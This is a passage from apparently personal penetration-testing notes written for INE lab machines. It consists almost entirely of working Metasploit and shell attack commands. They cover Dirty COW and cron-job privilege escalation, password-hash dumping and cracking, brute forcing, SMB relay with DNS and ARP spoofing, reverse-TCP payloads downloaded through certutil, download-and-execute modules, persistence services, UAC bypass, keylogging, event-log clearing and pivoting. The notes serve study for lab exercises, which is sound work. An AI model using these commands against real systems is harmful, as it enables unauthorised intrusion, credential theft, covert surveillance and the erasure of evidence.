/bin/bash -i
chmod +x les.sh
./les.sh
```

> This script works as the exploit suggester for linux.

```console
https://www.exploit-db.com/exploits/40839
```

> This link has the exploit for the dirty cow vulnerability.

```Shell
gcc -pthread <exploit-file-name>.c -o dirty -lcrypt
chmod +x dirty
```

> This forms the executable of the given file by the name `dirty`. After this upload the file on the machine using the meterpreter session.

***IF IT ISN'T WORKING YOU CAN THEN UPLOAD THE C FILE DIRECTLY ON TO THE MACHINE AND THEN RUN THESE COMMADS THERE TO FORM AND EXECUTABLE***

> After the script has ran successfully it will create a user by the name `firefart` that would have the root privileges.

#### Cron Jobs

> We will be targeting Cron Jobs that have been created by the `root` user in order to escalate our privileges.

```Shell
crontab -l
```

> The command to display the list of scheduled cron jobs for the current user is

```Shell
grep -nri “/tmp/message” /usr
```

> The command is used to search for the string `"/tmp/message"` within files located under the `/usr` directory.

```Shell
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

> Exploiting the cron jobs misconfiguration.

#### Exploiting SUID Binaries:

***SET OWNER USER ID***

```Shell
| -rwsr-xr-x | 1 | root  |  8344 | Sep 222  |  2018 | welcome
```

> Now here the `s` in the permissions section is the `SUID` permission. So that means it is being executed by the root privileges. 

```Shell
rm <file-name>
cp /bin/bash <file-name>
```

> Now if we remove a file that is being run by the welcome file as shown above and make a file with the same name but with the components of `/bin/bash`. Then upon executing the `welcome` file we will get the root privileges.

#### Dumping Linux Passwords Hashes:

```console
/etc/shadow
```

> This file has all the hashes for the user that are using that particular machine and this can only be accessed by a root user or a user with privileged access.

```console
root:$6$gvewkfv7o7i32ugbc328pgibcewuhjbh:45678:0:999999:7:::
```

> This is an exemplary hash 

```msfconsole
use post/linux/hashdump
show options 
set SESSION <session-ID>
run
```

> This modules will also perform the same function

```msfconsole
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

> This module can be used to crack a hash.

#### SMB & NetBIOS Enumeration:

```msfconsole
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
exploit
```

> This module can be used to exploit the machine using `smb` creds.

```Shell
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
```

> Hydra command to brute force `smb` users pass.

```cmd
run autoroute -s 10.0.22.69/20
```

> This command is related to managing and utilizing routes within a compromised network during a penetration test. By running `autoroute -s 10.0.22.69/20`, you are instructing Metasploit to add a route to the network `10.0.16.0/20` via the compromised machine.

```shell
cat /etc/proxychains4.conf
```

> Socks proxy configuration is in this file.

```msfconsole
use auxiliary/server/socks_proxy
show options
set SRVPORT 9050
set VERSION 4a 
exploit
jobs
```

> This module can be used to set up `socks4a` proxy chain.

```Shell
proxychains <command>
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
```

> This is how you can run commands to other machine using `proxychains` from `metasploit`.

```CMD
net view 10.0.22.69
```

> This lists down all the shared resources (if any) between two machines on a network.

```cmd
net use D: \\10.0.22.69\Documents
net use K: \\10.0.22.69\K$
dir D:
dir K:
```

> Command to load and access the shared resources.


#### SNMP Enumeration:

```Shell
nmap -sU -p 161 <ip-address>
```

> We must keep in mind that **nmap** does not check for **UDP** ports by default. As we already know, **SNMP** runs on the **UDP** port **161**. So we have to run a special specific scan.

```Shell
nmap -sU -p 161 --script=snmp-brute <ip-address>
```

>  nmap `snmp-brute` script can be used to find the community string. The script uses the `snmpcommunities.lst` list for brute-forcing it is located inside `/usr/share/nmap/nselib/data/snmpcommunities.lst` directory.

```Shell
snmpwalk -v 1 -c public demo.ine.local
```

> `snmpwalk` tool can be used to find all the information via SNMP.

`-v`: Specifies SNMP version to use.
`-c`: Set the community string.

```Shell
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
```

> The above command would run all the nmap SNMP scripts on the target machine and store its output to the`snmp_output`file.

```Shell
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
```

> After this `psexec` can be used to exploit the machine.

#### SMB Relay Attack:

```msfconsole
use exploit/windows/smb/smb_relay
show options
set LHOST <our-ip-address>
set SRVHOST <our-ip-address>
set SMBHOST <target-ip-address>
exploit
jobs
```

> This will start the server up for the relay attack.

```Shell
echo "<our-ip-address> *.sportsfoo.com" > dns
```

> By this command we have created a fake kind of `DNS` file that can be used to spoof the DNS then.

```Shell
dnsspoof -i eth1 -f dns
```

> The command  uses the `dnsspoof` tool to intercept and spoof DNS queries on the network interface `eth1`, using the DNS in the `dns` file that we just created. This is used to attract all the traffic towards the attacker machine.

```Shell
echo 1 > /proc/sys/net/ipv4/ip_forward
```

> This command can be used to enable ip-forwarding.

```Shell
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

> The attacker positions themselves in the middle of the communication between `172.16.5.5` and `172.16.5.1`, enabling a Man-in-the-Middle (MitM) attack.

***EXPLAINATION:***

The commands use `arpspoof` to perform ARP spoofing, tricking the devices at IP addresses `172.16.5.5` and `172.16.5.1` into thinking the attacker's MAC address belongs to each other. This redirects the network traffic between these two devices through the attacker, enabling a Man-in-the-Middle (MitM) attack.

#### Importing Nmap Scan Results Into MSF

> Following set of commands can be used to import a scan into your `msfconsole`

```msfconsole
nmap -sV -Pn -oX my-scan.xml <ip-address>
service postgresql start
msfconsole -q
db_status
db_import my-scan.xml
hosts
services
```

#### Network Service Scanning

***THIS IS DONE VIA PIVOTING AND EVERYTHING DEMOSTARTED UNDER IS DONE AFTER EXPLOITATION***

```shell
run autoroute -s <ip-address>
```

> This command can be used add the route to Metasploit's routing table.

***Press CTRL+Z and Enter y to background the meterpreter session in order to run the following command***

```msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set verbose false
set ports 1-1000
exploit
```

> This module can be used to run a portscan tcp module of Metasploit to scan the second target machine.

```shell
ls -al /usr/bin/nmap
file /usr/bin/nmap
```

> Check the static binaries available in the `/usr/bin/` directory.

```bash
#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

> Using the script provided at https://catonmat.net/tcp-port-scanner-in-bash as a reference, create a bash script to scan the first 1000 ports

```msfconsole
sessions -i 1
upload /usr/bin/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
```

> Background the session and then upload the created shell script.

```shell
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh demo2.ine.local
```

> Make the binary and script executable and use the bash script to scan the second target machine.

#### FTP Enumeration:

```msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS <ip-address>
set verbose false
set ports 1-1000
exploit
```

> This module can be used to perform a simple port scan on the target machine.

```msfconsole
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_version
set RHOST <ip-address>
run
```

> This can be used to scan the FTP version running on the target.

```msfconsole
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_login
set RHOST <ip-address>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

> This module can be used to brute force FTP usernames and their respective passwords.

```msfconsole
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/anonymous
set RHOSTS <ip-address>
run
```

> This will check whether there is an anonymous login vulnerability.

#### SMB Enumeration:

```msfconsole
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_version
set RHOSTS <ip-address>
run
```

> This will give us the SMB version on the machine.

```msfconsole
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_enumunsers
set RHOSTS <ip-address>
run
```

> It gives us all the users on the machine

```msfconsole
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <ip-address>
set ShowFiles true
run
```

> This will give all the shared files and shared details.

```msfconsole
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_login
set RHOSTS <ip-address>
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

> This module can be used to brute force the password for particular user `admin` in this case.

```shell
smbclient -L \\\\<ip-address>\\ -U admin
```

> After this command a prompt to enter the password will arrive and then after entering the correct password it will list down all the shared files and all.

```Shell
smbclient -L \\\\<ip-address>\\<share-name> -U admin
smbclient -L \\\\192.168.33.42\\public -U admin
```

> This can be used to access are particular share.

#### Web Server Enumeration:

```msfconsole
search type:auxiliary name:http
use auxiliary/scanner/http/http_version
set RHOTS <ip-address>
run
```

> This is will give the `http` version running on the system.

```msfconsole
search type:auxiliary name:http
use auxiliary/scanner/http/http_header
set RHOSTS <ip-address>
run
```

> Tells the data related to the HTTP header.

```msfconsole
use auxiliary/scanner/http/robots_txt
show options
set RHOST <ip-address>
run
```

> Will show the data of `robots.txt`.

```msfconsole
use auxiliary/scanner/http/dir_scanner
show options
set RHOSTS <ip-address>
set DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt
run
```

> This module can be used to enumerate directories.

```msfconsole
use auxiliary/scanner/http/files_dir
show options
set RHOSTS <ip-address>
set DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt
run
```

> This can give you the names of different files on the machine

```msfconsole
use auxiliary/scanner/http/http_login
show options
set RHOSTS <ip-affress>
set AUTH_URI /<URI>/
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
set VERBOSE false
run
```

> This will find brute force credentials. 

```msfconsole
use auxiliary/scanner/http/apache_userdir_enum
show options
set RHOSTS <ip-affress>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set VERBOSE fals
run
```

> This can be used to brute force users on the target.

```msfconsole
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run
```

> Using this module write a file on the target server. If the file is already exists it will overwrite it.

```Shell
wget http://victim-1:80/data/test.txt 
cat test.txt
```

> Use `wget` and download the `test.txt` file and verify it.

```msfconsole
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run
```

> This module can be used to `DELETE` the `test.txt` file.

#### MySQL Enumeration:

```msfconsole
use auxiliary/scanner/mysql/mysql_version
show options
set RHOTS <ip-address>
run
```

> This module can be used to find the module of the SQL running on the machine.

```msfconsole
use auxiliary/scanner/mysql/mysql_login
show options
set RHOTS <ip-address>
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

> This can be used to brute force my SQL user `root`.

```msfconsole
use auxiliary/admin/mysql/mysql_enum
show options
set USERNAME root
set PASSWORD twinkle
set RHOTS <ip-address>
run
```

***NOTE: THIS MODULE CAN ONLY RUN IF YOU HAVE VALID CREDS OF A USER ACCOUNT***

> This enumerates info. related to the SQL service running on the system.

```msfconsole
use auxiliary/admin/mysql/mysql_sql
show options
set USERNAME root
set PASSWORD twinkle
set RHOTS <ip-address>
set SQL <any-quary>
run
```

> This module can be used to execute SQL Commands.

```msfconsole
use auxiliary/scanner/mysql/mysql_schemadump
show options
set USERNAME root
set PASSWORD twinkle
set RHOTS <ip-address>
run
```

> This shows tables in the respective tables.

```msfconsole
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
```

> This module can be used to enumerate files in a SQL.

```msfconsole
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

> This module dumps all the hashes from the user.

```msfconsole
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

> This module gives us the list of all the writeable directories within a machine.

#### SSH Enumeration:

```msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <ip-address>
run
```

> This system gives the version of SSH running on the machine.

```msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOTS <ip-address>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set VERBOSE false
run
```

> This can be used to brute force username and their passwords.

```msfconsole
use auxiliary/scanner/ssh/ssh_enumusers
set RHOTS <ip-address>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

> This can be enumerate users on the system.

#### SMTP Enumeration:

```msfconsole
use auxiliary/scanner/smtp/smtp_version
set RHOSTS <ip-address>
run
```

> This system gives the version of SMTP running on the machine.

```msfconsole
use auxiliary/scanner/smtp/smtp_users
set RHOTS <ip-address>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run
```

> This can be used to brute force usernames.

```shell
nmap -sV -script banner <ip-address>
```

> This SMTP version tells us about the SMTP server name and banner.

```shell
nc demo.ine.local 25
```

> Net Cat can be used to interact with the system.

```console
VRFY <user>@<domain>.xyz
VRFY commander@openmailbox.xyz
```

> This can be used to verify a user for a certain domain.

```
telnet <ip-address> 25
HELO attacker.xyz
EHLO attacker.xyz
```

> This tells us what commands can be used to check the supported commands/capabilities.

```Shell
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <ip-address>
```

> This command can be used to find common users using the tool `smtp-user-enum`

```shell
telnet demo.ine.local 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
```

> This how we can connect to SMTP service using telnet and send a fake mail to root user. There is a dot(.) in the last line which indicates the termination of data.

```Shell
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```

> Sending mail through command line.

#### WMAP MSF Plugin commands:

`load wmap`: To load the plugin
`wmap_sites -a <IP>`: Is can be used to add a site.
`wmap_sites -l`: Is used to list out all the available sites.
`wmap_targets -t <URL>`: Is used to add a target URL.
`wmap_targets -l`: Is used to list out all the targets that are available.
`wmap_run -t`: This will show all enabled modules.
`wmap_run -e`: This will start running the vuln. scan.
`wmap_vuln -l`: This lists all the vulnerabilities that the scan was able to find.

```msfconsole
use auxiliary/http/options
show options
set RHOSTS <ip-address>
run
```

> This module tells us if the web-application allows different methods like `GET`, `HEAD`, `POST`, and `OPTIONS`.

```msfconsole
use auxiliary/http/http_put
show options
set RHOSTS <ip-address>
set PATH /<directory>/
run
```

> This can be used to upload a file on to the specified directory.

#### Exploiting WinRM

***DEFAULT PORT `5986`***

```msfconsole
search type:auxiliary winrm
use auxiliary/winrm/winrm_auth_methods
set RHOSTS <ip-address>
run
```

> This will tell that whether `WinRM` is running on the machine and if it running than what authentication methods are being used.

```msfconsole
use auxiliary/winrm/winrm_login
set RHOST <ip-address>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
Set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

> This can be used to brute force usernames and their respective passwords.

```msfconsole
use auxiliary/winrm/winrm_cmd
set RHOST <ip-address>
set USERNAME <user>
set PASSWORD <pass>
set CMD whoami
run
```

> This can be used to run commands on the machine

```msfconsole
use exploit/windows/winrm/winrm_script_exec
set RHOST <ip-address>
set USERNAME <user>
set PASSWORD <pass>
set FORCE_VBS true
run
```

> This can be used to obtain a meterpreter session on the service.

#### Exploitation of Tomcat

```msfconsole
search type:exploit tomcat_jsp
use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOST <ip-address>
set pyload java/jsp_shell_blind_tcp
set SHELL cmd
exploit
```

> This will give you a command shell session but not a meterpreter session on the system.

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local-ip> LPORT=1234 -f exe > meterpreter.exe 
```

> This is a payload file that we will transfer on to the system and then we'll use it to get a meterpreter session.

```shell
sudo python -m SimpleHTTPServer 80
```

> Command to start a simple `HTTP File Server`.

```CMD
certutil -url http://<local-ip>/meterpreter.exe meterpreter.exe
```

> This can be used to download the file from the HTTP server with accessing the browser.

```msfconsole
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <local-ip>
set LPORT
run
```

> Set up a multi handler to get a meterpreter shell.

```CMD
./meterpreter.exe
```

> Run the script from the java shell and you'll receive a meterpreter session on the msfconsole.

#### VSFTPD Exploitation:

```msfconsole
search vsftpd
use 1
set RHOST <ip-address>
exploit
```

> Exploit module for `vsftpd 2.3.4`. It gives you rot privileges

```msfconsole
CTRIL + Z
y
use post/multi/manage/shell_to_meterpreter
show options
set LHOST <local-ip>
run
```

> It can be used to convert the shell session to a meterpreter session. If it gives an error don't worry you can access the session from the `sessions` command.

#### SAMBA Exploitation

```msfconsole
search type:exploit name:samba
use exploit/linux/samba/is_known_pipename
set RHOST <ip-address>
check
exploit
```

> `check` command can be used to identify whether the system is vulnerable or not. This will give us a command shell session not a meterpreter session so we would have to go it our selves using `shell_to_meterperter` module.

```msfconsole
CTRIL + Z
y
use post/multi/manage/shell_to_meterpreter
show options
set LHOST <local-ip> 
set LHOST eth1
run
```

> It can be used to convert the shell session to a meterpreter session. If it gives an error don't worry you can access the session from the `sessions` command.

#### SSH Exploitation:

```msfconsole
search libssh_auth_bypass
use 1
show options
set RHOST <ip-address>
set SPAWN_PTY true
run
```

> This can be used to tell weather it is vulnerable and can be used to gain a sell session.

```msfconsole
CTRIL + Z
y
use post/multi/manage/shell_to_meterpreter
show options 
set LHOST eth1
set SESSION <session-id>
run
```

> It can be used to convert the shell session to a meterpreter session. If it gives an error don't worry you can access the session from the `sessions` command. Other than this you can also use the `sessions -u 1` command to upgrade a shell session into a meterpreter session.

#### SMTP Server Exploitation

```msfconsole
search type:exploit name:haraka
use 1
set rhost <ip-address>
set SEVPORT 9898
set email_to <email-address>
set payload linux/x64/meterpreter_reverse_http
set LHOST eth1
run
```

> This module after running will give us a meterpreter session. In the module `email_to` should be an email that the server should accept.

#### Meterpreter Commands:

- `sysinfo`: This gives us basic system info like the OS, PC Name and all
- `get uid`: This command tells us about our permissions.
- `help`: This gives all the commands and their details.
- `backgroud`: This is used to put the session in background.
- `kill`: This will kill the current session.
- `search -d /dir/path -f "<file-name>"`: This command can be used to find a particular file in a directory.
- `search -f *.exe`: This can be used to find all the `exe` file or any extension that you'll enter.
- `download <file-name>`: This can be used to download a file.
- `shell`: This can be used to pop the native shell of the machine.
- `ps`: This can be used to list down all the processes.
- `getsystem:` This command can be used to automatically elevate the privileges of the current exploited user on **windows**.
- `screenshot:` This command can be used to click a screenshot of the **windows screen**.
- `hashdump`: This command can be used to dump all the hashes of passwords with in the SAM DB.
- `show_mount`: This will tell all the disks mounted with the windows user.
- `migrate <pid>`: This can be used to migrate to any current running processes.
- `loot`: After that you have ran some enumeration modules you can find the data saved in texts using this command 

#### Windows Post Exploitation Module:

```msfconsole
use post/windows/manage/migrate
set SESSION <session-id>
run
```

> This module can be used to create a new process and then migrate into it. If you already have migrated then this would not work.

```msfconsole
use post/windows/gather/win_privs
show options
set SESSION <session-id>
run
```

> This is list out all the privileges that the current exploitered user have.

```
use post/windows/gather/enum_logged_on_users
show options
set SESSION <session-id>
run
```

> This will list all the currently and recently logged on users.

```msfconsole
use post/windows/gather/checkvm
show options
set SESSION <session-id>
run
```

> This will tell us weather that machine is a VM or not.

```msfconsole
use post/windows/gather/enum_applications
show options
set SESSION <session-id>
run
```

> This lists down all the application and their respective versions installed on the machine so that they can be used to further exploit and elevate the privileges.

```msfconsole
use post/windows/gather/enum_av_excluded
show options
set SESSION <session-id>
run
```

> This module can be used to list out all the directories that are currently not looked after by the AV or the Win Defender.

```msfconsole
use post/windows/gather/enum_computers
show options
set SESSION <session-id>
run
```

> This will tell us whether the machine is a stand alone machine or a machine that is part of a domain.

```msfconsole
use post/windows/gather/enum_patches
show options
set SESSION <session-id>
run
```

> This will give us the patches that being installed in the machine. You can also do this by typing the `shell > systeminfo` command as it is a native windows command.

```msfconsole
use post/windows/gather/enum_shares
show options
set SESSION <session-id>
run
```

> This will lists all the shares within the machine.

```msfconsole
use post/windows/manage/enable_rdp
show options
set SESSION <session-id>
run
```

> This will tell us whether `RDP` is enabled on the machine or not. If it isn't enabled than it will enable it by it self.

#### Bypassing UAC Through Memory Injection:

***EVERYTHING DEMOSTARTED BELOW IS DONE AFTER THE FIRST FOOTHOLD HAS BE GAINED***

```
Ctrl + Z
y
use exploit/windows/local/bypassuac_injection
set SESSION <session-id>
set LPORT 4433
set TARGET\ x64
run
```

> This will bypass UAC using the injection method.

***NOW THIS WILL NOT ELEVATE OUR PRIVILAGES BUT WILL GIVE A NEW METERPRETER SESSION THAT WILL HAVE THE UAC FLAG TURNED OFF AND AFTER THAT YOU CAN USE THE*** **`getsystem`** ***COMMAND TO ELIVATE YOUR PRIVILEGES***

#### Establishing Persistence on Windows:

```msfconsole
use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
show options
set SESSION <session-id>
run
```

> This will startup a service that we can always connect to via a handler after the current session is terminated.

```msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST eth1
run
```

> Now if you run this you'll immediately get a meterpreter sessions.

***ALWAYS KEEP IN MIND THE*** **`LHOST`** ***AND*** **`LPORT`** ***OPTIONS***

#### Enabling RDP

```msfconsole
use post/windows/manage/enable_rdp
show options
set RHOSTS <ip-address>
set SESSION <session-id>
run
```

> This will enable the `RDP` service on port `3389`. 

***NOW AFTER THIS WE WOULD HAVE TO CHANGE THE PASSWORD IN ***

```msfconsole
shell
net users
net user administrator <password-any>
```

> This will change the password of the `administrator` user. This can only be done via a privileged access.

```shell
xfreerdp /u:administrator /p:<password-any> /v:<ip-address>
```

> This command can be used from the console of your linux machine in order to interact with the `RCD` of the target machine using the new creds.

#### Windows Keylogging:

***FIRST MIGRATE TO*** **`explorer`** ***PROCESS AND THEN RUN THE KEYLOGGER.***

```msfconsole
pgrep explorer
migrate <pid>
```

> Migration to `explorer`

`keyscan_start`: This will start the key stroke sniffer.
`keyscan_dump`: This will dump all the captured key strokes.

#### Clearing Windows Logs:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.

`clearev`: This command in the meterpreter is used to clear the event logs of the machine.

#### Pivoting:

```msfconsole
run autoroute -s 10.0.16.0/20
```

> This command can be used to set route from one network to another network. First type `ifconfig` or `ipconfig` to check all the possible interfaces on the machine.

```msfconsole
background
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
exploit
```

> This module can be then used to run a port scan on the machine who's network route we have just added.

```msfconsole
sessions -i 1
portfwd add -l 1234 -p 80 -r demo2.ine.local
portfwd list
```

> These set of commands can be used to port forward a port of the target machine on to a port of `localhost`.

```shell
nmap -sV -sS -p 1234 localhost
```

> Now you can run a scan the target machines port using this command.

#### Linux Post Exploitation Modules

- `cat /etc/passwd`: This command lists out all the users and service accounts on the machine and needs `root` privileges to execute.
- `groups <username>`: This will tell you which user group the entered username belongs to.
- `bin/bash -i`: This command can be used to get a bash shell after meterpreter session is opened.
- `cat /etc/*issue`: This will tell you the release version of the machine.
- `uname -r`: This tells the kernel version:
- `ps aux`: This command lists down all the processes running on the system.
- `env:` This tells all the environment valuables for the current logged in user.

```msfconsole
use post/linux/gather/enum_configs
show options
set SESSION <session-id>
run
```

> This will give addresses of all the configuration files on the machine.

```msfconsole
use post/linux/gather/env
show options
set SESSION <session-id>
run
```

> This will show all the env related data like versions and all.

```msfconsole
use post/linux/gather/enum_network
show options
set SESSION <session-id>
run
```

> This will give all the network related data and configuration files.

```msfconsole
use post/linux/gather/enum_protections
show options
set SESSION <session-id>
run
```

> This module checks all the basic system hardening methods are in place or not.

```msfconsole
use post/linux/gather/enum_system
show options
set SESSION <session-id>
run
```

> This gathers system and user infos.

```msfconsole
use post/linux/gather/checkcontainer
show options
set SESSION <session-id>
run
```

> This will check whether we are in a container or an actual machine.

```msfconsole
use post/linux/gather/checkvm
show options
set SESSION <session-id>
run
```

> This will tell that weather the machine is a VM or an actual machine.

```msfconsole
use post/linux/gather/enum_users_history
show options
set SESSION <session-id>
run
```

> This lists down all the users history and commands that a specific user ran. It is saved in `loot` as well and you can access the saved data from there as well.

```msfconsole
use post/multi/manage/system_session
set SESSION <session-id>
set TYPE python
set HANDLER true
set LHOST <host-ip>
run
```

> This module will create a Reverse TCP Shell on the target system using the system's own scripting environments installed on the target.

***FUN STUFF***

```bash
useradd hacker
useradd test
useradd nick
```

> Create a file with the following data and name it as `test.sh`.

```shell
/etc/init.d/apache2 start
cp test.sh /var/www/html
```

> Turn the `apache2` and copy the created file in the `/var/www/html` directory

```msfconsole
use post/linux/manage/download_exec
set URL http://<HOST-IP>/test.sh
set SESSION 1
run
```

> Now use this module to download and run the file on the target machine.

```msfconsole
sessions -i 1
cat /etc/passwd
```

> Now after the execution three users will be created you can check them using the following commands.

#### Linux Privilege Escalation: Exploiting a vulnerable program

***IT DEPENDS ON THE VERSION OF THE LINUX KERNEL RUNNINGON THE MACHINE AND THE DISTRIBUTION VERSION***

```ruby
sessions -u <session-id>
```

> This command can be used to upgrade your current session into a meterpreter session and if it gives you can error then don't worry you can check the new session from the `sessions` command and than load the new one.

```bash
chkrootkit -V
```

> This can be used to check the rootkit version running on the linux machine.

***VERSIONS OLDER THAN 0.50 OF THE CHKROOTKIT ARE VULNARABLE TO LOCAL PRIVELAGE ESCALATION VULNARABILITY***

```msfconsole
search exploit/unix/local/chkrootkit
show options
set CHKROOTKIT /path/to/file
set SESSION <session-id>
set LHOST <localhost-ip>
exploit
```

> This will exploit the vulnerability by creating a cron job.
